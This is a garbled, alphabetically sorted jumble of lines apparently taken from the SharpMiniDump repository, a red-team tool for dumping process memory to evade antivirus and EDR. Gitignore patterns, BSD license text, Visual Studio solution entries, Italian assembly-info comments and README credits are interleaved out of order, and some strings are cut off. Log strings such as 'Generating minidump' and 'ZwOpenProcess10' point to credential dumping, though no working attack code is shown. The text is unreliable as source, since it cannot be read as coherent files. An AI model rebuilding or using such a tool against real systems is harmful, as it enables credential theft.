+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""SharpMiniDump"", ""SharpMiniDump"
+"Redistribution and use in source and binary forms, with or without"
+"SharpMiniDump is a rough port of this project [Dumpert](https://github.com/outflanknl/Dumpert) by [@Cn33liz](https://twitter.com/Cneelis) and you will find the detail in this [post](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/), so BIG credits to him."
+"SharpMiniDump.csproj"", ""{6FFCCF81-6C3C-4D3F-B15F-35A86D0B497F}"""
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""SharpMiniDump"")]"
+"[assembly: AssemblyTitle(""SharpMiniDump"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""6ffccf81-6c3c-4d3f-b15f-35a86d0b497f"")]"
+"] End "")"
+"] Generating minidump.... "" "
+"] Minidump generated in  "" "
+"] OS MajorMinor version : "" "
+"] PssCaptureSnapshot "" "
+"] Target PID "" "
+"] ZwOpenProcess10  "" "
+"dumpert.dmp"")"
+"modification, are permitted provided that the following conditions are met:"
+"ntdll.dll"").</param>"
+"x64'"">"
+"xml version=""1.0"" encoding=""utf-8"""
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$tf/
+' come illustrato di seguito:
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.JustCode
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cachefile
+.coverage
+.coveragexml
+.cr/personal
+.dbmdl
+.dbproj.schemaview
+.dotCover
+.e2e
+.fake/
+.gpState
+.hhc
+.hhk
+.hhp
+.htm
+.ilk
+.iobj
+.ipdb
+.jfm
+.jmconfig
+.ldf
+.local.xml
+.localhistory/
+.log
+.mdf
+.meta
+.mfractor/
+.mm.
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln.docstates
+.snk
+.snupkg
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbw
+.vs/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.xml
+.xsd.cs
+//      Numero di build
+//      Revisione
+//      Versione principale
+//      Versione secondaria
+// Author: B4rtik (@b4rtik)
+// Le informazioni generali relative a un assembly sono controllate dal seguente 
+// Le informazioni sulla versione di un assembly sono costituite dai seguenti quattro valori:
+// License: BSD 3-Clause
+// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
+// Project: SharpMiniDump (https://github.com/b4rtik/SharpMiniDump)
+// ai componenti COM. Se 
+// associate a un assembly.
+// set di attributi. Modificare i valori di questi attributi per modificare le informazioni
+// usando l'asterisco '
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+3. Neither the name of the copyright holder nor the names of its
+</OutputPath>
+</Project>
+ASALocalRun/
+All rights reserved.
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AppPackages/
+AutoTest.Net/
+BSD 3-Clause License
+Backup
+BenchmarkDotNet.Artifacts/
+BundleArtifacts/
+ClientBin/
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+Debug
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+EndGlobal
+EndGlobalSection
+EndProject
+FakesAssemblies/
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HideSolutionNode = FALSE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OpenCover/
+Other credits go to [@cobbr_io](https://twitter.com/cobbr_io) and [@TheRealWover](https://twitter.com/TheRealWover) for their work on [SharpSploit](https://github.com/cobbr/SharpSploit) (Execution / DynamicInvoke)
+Package.StoreAssociation.xml
+PublishScripts/
+Release
+SERVICES
+ServiceFabricBackup/
+SolutionGuid = {C4236FC6-7C6F-413C-9583-2CF9548B531E}
+StyleCopReport.xml
+System32
+TRACE</DefineConstants>
+Temp
+TestResult.xml
+UpgradeLog
+VisualStudioVersion = 15.0.28307.136
+Windows
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[assembly: ComVisible(false)]
+_Chutzpah
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+artifacts/
+bld/
+bower_components/
+crunch
+csx/
+dlldata.c
+ecf/
+healthchecksdb
+ipch/
+issue-259490424)
+issuecomment-104372622)
+mono_crash.
+nCrunchTemp_
+namespace SharpMiniDump
+node_modules/
+nunit-
+orleans.codegen.cs
+paket-files/
+project.fragment.lock.json
+project.lock.json
+publish/
+rcf/
+using System
+using System.Collections.Generic
+using System.ComponentModel
+using System.Diagnostics
+using System.IO
+using System.Linq
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Security
+using System.Security.Cryptography
+using System.Text
+using System.Threading
+using static SharpMiniDump.Natives
+wwwroot/
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x64/
+x86/
+{6FFCCF81-6C3C-4D3F-B15F-35A86D0B497F}.Debug
+{6FFCCF81-6C3C-4D3F-B15F-35A86D0B497F}.Release
